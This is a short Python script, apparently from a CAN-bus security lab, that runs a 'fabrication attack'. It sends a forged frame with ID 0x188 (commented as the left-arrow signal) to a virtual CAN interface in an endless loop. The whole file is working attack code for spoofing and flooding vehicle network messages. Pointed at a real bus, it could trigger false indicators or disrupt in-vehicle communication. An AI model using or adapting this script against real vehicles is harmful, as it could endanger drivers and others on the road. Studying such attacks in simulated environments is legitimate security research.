import can 

CAN_INTERFACE = "vcan0"  
ID = 0x188 #left arrow ID  

def fab_attack(bus):
    data = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)

    try:
        while True:
            bus.send(msg)
            print(f"Fab msg: {msg}")
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("Interruption of messages by keyboard")
    except can.CanError as e:
        print(f"CAN error: {e}")

if __name__ == "__main__":
    with can.interface.Bus(channel=CAN_INTERFACE, bustype="socketcan") as bus:
        fab_attack(bus)

